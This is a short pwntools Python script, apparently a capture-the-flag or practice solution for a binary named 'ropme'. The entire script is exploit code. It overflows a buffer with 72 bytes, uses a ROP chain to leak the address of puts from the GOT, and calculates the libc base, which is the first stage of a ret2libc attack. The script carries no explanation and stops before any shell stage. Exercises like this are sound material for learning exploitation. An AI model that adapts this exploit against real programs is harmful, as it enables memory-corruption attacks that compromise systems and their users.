#!/bin/env python3
from pwn import *

elf = context.binary = ELF('./ropme')
libc = elf.libc
p = elf.process()

# ret2plt ?
rop = ROP(elf)

rop.raw('A' * 72)
rop.puts(elf.got['puts'])
rop.raw(elf.symbols['main'])

p.sendline(rop.chain())

p.recvline()
puts = u64(p.recv(6) + b'\x00\x00')
log.success(f'Leaked puts: {hex(puts)}')

# get base
libc.address = puts - libc.symbols['puts']
log.success(f'Libc base: {hex(libc.address)}')
